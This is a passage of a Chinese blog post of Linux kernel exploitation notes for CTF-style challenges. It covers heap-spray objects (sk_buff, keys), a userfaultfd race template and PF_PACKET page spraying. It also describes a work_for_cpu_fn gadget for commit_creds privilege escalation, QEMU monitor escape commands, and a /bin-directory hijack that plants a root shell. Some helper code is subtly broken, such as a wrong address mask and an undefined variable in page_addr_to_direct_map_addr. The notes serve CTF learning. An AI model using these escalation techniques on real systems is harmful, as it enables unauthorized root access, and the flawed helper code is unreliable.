<p>因此我们仍然可以实现近乎任意大小 object 的分配与释放</p>
<p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-02_213558.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">	__u8		flags;</span><br><span class="line">	__u8		meta_len;</span><br><span class="line">	__u8		nr_frags;</span><br><span class="line">	__u8		tx_flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	gso_size;</span><br><span class="line">	<span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	gso_segs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>	*<span class="title">frag_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>	gso_type;</span><br><span class="line">	u32		tskey;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic_t</span>	dataref;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment">	 * remains valid until skb destructor */</span></span><br><span class="line">	<span class="type">void</span> *		destructor_arg;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line">	<span class="type">skb_frag_t</span>	frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p>
<p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p>
<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p><strong>申请obj大小:任意</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:泄露.text|泄露直接映射区地址</strong></p>
<p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p>
<p>内核提供了两个系统调用来负责这些操作</p>
<p><code>add_key()</code>和<code>keyctl()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure>
<p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p>
<ul>
<li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li>
<li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li>
<li>释放 obj1 与 obj2，返回密钥 id</li>
</ul>
<p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure>
<p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p>
<p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p>
<p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p>
<p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p>
<p>当释放一个密钥时</p>
<p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p>
<h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><p><strong>申请obj大小:任意</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:泄露.text|泄露直接映射区地址</strong></p>
<p>io_uring是自内核版本 5.1 引入的全新的高性能异步 I/O 框架,</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="userfaultfd-1"><a href="#userfaultfd-1" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p>
<p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p>
<p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p>
<p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p>
<p>一个模板:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pgv页级分配"><a href="#pgv页级分配" class="headerlink" title="pgv页级分配"></a>pgv页级分配</h2><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p>
<p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p>
<p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>即</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure>
<p>那么之后当我们创建如下这样一个结构体时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure>
<p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p>
<p>并且当关闭socket时,会将这些页框释放</p>
<p>最后需要注意的是</p>
<blockquote>
<p>需要注意的是低权限用户无法创建一个类型为 <code>SOCK_RAW</code> 协议为 <code>PF_PACKET</code> 的 socket，但是我们可以通过开辟新的命名空间来绕过该限制，不过这样也有一定的缺陷：我们的进程也被隔离到该进程里了，无法获得“真正的 root 权限”</p>
<p>因此我们最好的做法便是开辟一个子进程，在该子进程中开辟新命名空间专门进行堆喷，父进程/其他子进程用于提权，通过管道与该子进程进行交互</p>
</blockquote>
<h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>一个十分神奇的gadget</p>
<p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">void</span> *arg;</span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">	wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到其会有如下调用</p>
<p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p>
<p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p>
<blockquote>
<p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p>
</blockquote>
<h1 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><h2 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h2><p>当qemu启动脚本中没有重定向monitor时，可以直接ctrl+A C逃逸，解压rootfs.img读flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with <span class="built_in">id</span>(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></figure>
<h2 id="bin目录不为ROOT"><a href="#bin目录不为ROOT" class="headerlink" title="bin目录不为ROOT"></a>bin目录不为ROOT</h2><p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p>
<h2 id="根目录不为ROOT"><a href="#根目录不为ROOT" class="headerlink" title="根目录不为ROOT"></a>根目录不为ROOT</h2><p>那么在根目录下，虽然bin的所有者为root，但是可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin evil_bin</span><br><span class="line">/evil_bin/mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<h2 id="密码设置"><a href="#密码设置" class="headerlink" title="密码设置"></a>密码设置</h2><p>如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。</p>
<p>又或者是默认的密码<code>#</code>,当然其实很多内核并没有提供su</p>
<p>例如linectf2022-encrypt</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">First, connect via netcat.</span><br><span class="line">We got a shell, let&#x27;s look around:</span><br><span class="line">/ $ ls</span><br><span class="line">=&gt; We see the flag file.</span><br><span class="line">/ $ cat flag</span><br><span class="line">=&gt; Not enough permissions.</span><br><span class="line">Are there many other users?</span><br><span class="line">/ $ cat /etc/passwd</span><br><span class="line">=&gt; Only root seems to be available. Let&#x27;s try switching to it:</span><br><span class="line">/ $ su</span><br><span class="line">/ #</span><br><span class="line">=&gt; See the #? This worked! We got root!</span><br><span class="line">/ # cat flag</span><br></pre></td></tr></table></figure>
<h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><p>带有suid的可执行文件允许我们拥有文件所有者的权限</p>
<p>还是lincectf2022的encrypt</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p>打印的字符串告诉我们busybox具有这个权限位</p>
<p>Run busybox and it will show us all the configurations which are avialable</p>
<p>发现其中具有su于是</p>
<p><code>busybox su root</code></p>
<h1 id="linux支持"><a href="#linux支持" class="headerlink" title="linux支持"></a>linux支持</h1><h2 id="direct-map-addr-to-from-page-addr"><a href="#direct-map-addr-to-from-page-addr" class="headerlink" title="direct_map_addr_to/from_page_addr"></a>direct_map_addr_to/from_page_addr</h2><p>直接映射区的虚拟地址可以通过线性对应关系与vmemmap段的page结构相互转化</p>
<p>而每一个page结构体又对应着唯一一个PGN</p>
<p>又因为直接映射区上的地址减去<code>page_offset_base</code>就是物理内存地址,所以这些之间存在直观的直接线性关系</p>
<p>关系如下</p>
<p><strong>direct_map_addr_to_page_addr</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>page_addr_to_direct_map_addr</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">page_addr_to_direct_map_addr</span><span class="params">(<span class="type">size_t</span> vmem_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((vmem_map_addr &amp; (~<span class="number">0x40</span>)) - vmemmap_base) / <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> direct_map_addr + page_count * <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="setreuid-setregid"><a href="#setreuid-setregid" class="headerlink" title="setreuid/setregid"></a>setreuid/setregid</h2><p>内核判断用户的依据是当前进程<code>cred</code>结构体中<code>uid</code>与<code>euid</code>两个字段</p>
<p>特别的当我们需要提权为<code>root</code>时</p>
